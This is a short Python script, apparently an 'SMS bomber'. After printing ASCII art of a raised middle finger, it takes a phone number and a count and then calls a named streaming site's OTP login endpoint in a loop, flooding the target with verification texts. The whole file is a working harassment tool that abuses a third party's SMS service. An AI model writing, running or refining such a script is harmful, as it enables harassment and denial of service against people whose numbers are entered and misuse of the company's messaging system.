import requests ,os

os.system("clear")

noob= """

________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$

"""

print(noob)

number=str(input(" Enter Ther number : "))

amount=int(input(" Enter SMS amount : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range (amount):

  requests.get(api)

  print(str(i+1)+"SMS SEND ðŸ˜ˆ")
